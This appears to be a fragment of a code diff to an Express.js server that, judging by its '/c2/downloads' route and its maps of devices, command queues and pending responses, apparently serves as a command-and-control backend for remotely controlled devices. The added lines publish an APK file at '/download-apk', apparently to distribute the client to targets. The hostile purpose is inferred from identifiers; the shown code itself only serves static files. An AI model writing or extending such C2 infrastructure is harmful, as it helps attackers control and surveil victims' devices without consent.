@@ -19,6 +19,10 @@ if (!fs.existsSync(UPLOADS_DIR)) {
 }
 app.use('/c2/downloads', express.static(UPLOADS_DIR));
 
+// Servir archivos públicos (APK)
+const PUBLIC_DIR = path.join(__dirname, 'public');
+app.use('/download-apk', express.static(PUBLIC_DIR));
+
 const devices = new Map();
 const commandQueues = new Map();
 const pendingResponses = new Map();
